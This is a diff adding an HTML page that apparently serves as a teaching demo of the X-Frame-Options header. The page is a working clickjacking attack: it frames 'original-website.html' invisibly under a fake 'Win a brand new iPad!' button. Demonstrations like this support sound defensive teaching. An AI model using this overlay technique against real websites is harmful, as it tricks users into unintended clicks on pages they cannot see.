@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>X-Frame-Options Demo: Malicious website</title>
+	<style>
+		body {font-family:Arial,sans-serif;font-size:14px;line-height: 1.5;color:#333333;background-color:#ffffff;}
+		button {color:#ffffff;background-color:#3276b1;padding:5px 8px;font-size:16px;line-height:1.33;border:0 none;border-radius:6px;text-align:center;vertical-align:middle;cursor:pointer;}
+
+		iframe {
+			width: 850px;
+			height: 370px;
+			position: absolute;
+			top: -198px;
+			left: -424px;
+
+			/* Iframe ist unsichtbar */
+			filter: alpha(opacity=0);
+			opacity: 0;
+		}
+	</style>
+</head>
+<body>
+	<h1>Win a brand new iPad!</h1>
+	<iframe src="original-website.html" frameborder="0" seamless></iframe>
+	<button>Click me!</button>
+	<h3>Just click the button to win … it's that easy!</h3>
+</body>
+</html>
